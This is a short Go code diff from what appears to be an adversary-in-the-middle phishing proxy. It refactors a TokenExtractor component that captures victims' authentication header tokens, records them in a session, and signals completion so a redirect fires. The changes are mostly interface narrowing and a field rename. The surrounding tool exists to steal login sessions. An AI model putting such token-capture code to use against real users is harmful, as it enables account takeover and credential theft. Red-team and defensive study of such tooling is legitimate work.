@@ -9,6 +9,14 @@ import (
 	"github.com/travisbale/mirage/internal/proxy"
 )
 
+type sessionUpdater interface {
+	UpdateSession(session *aitm.Session) error
+}
+
+type eventPublisher interface {
+	Publish(event aitm.Event)
+}
+
 // SessionCompleter checks whether all required auth tokens have been captured.
 type SessionCompleter interface {
 	IsComplete(sess *aitm.Session, def *aitm.PhishletDef) bool
@@ -23,8 +31,8 @@ type TemporaryWhitelister interface {
 // When all required tokens are captured it marks the session complete and
 // publishes EventSessionCompleted so the WebSocket redirect fires.
 type TokenExtractor struct {
-	Store     proxy.SessionUpdater
-	Bus       aitm.EventBus
+	Store     sessionUpdater
+	Bus       eventPublisher
 	Completer SessionCompleter
 	Whitelist TemporaryWhitelister // may be nil
 }
@@ -100,10 +108,10 @@ func (h *TokenExtractor) extractHeaderToken(ctx *aitm.ProxyContext, resp *http.R
 					continue
 				}
 			}
-			if ctx.Session.HttpTokens == nil {
-				ctx.Session.HttpTokens = make(map[string]string)
+			if ctx.Session.HTTPTokens == nil {
+				ctx.Session.HTTPTokens = make(map[string]string)
 			}
-			ctx.Session.HttpTokens[headerName] = captured
+			ctx.Session.HTTPTokens[headerName] = captured
 			return true
 		}
 	}
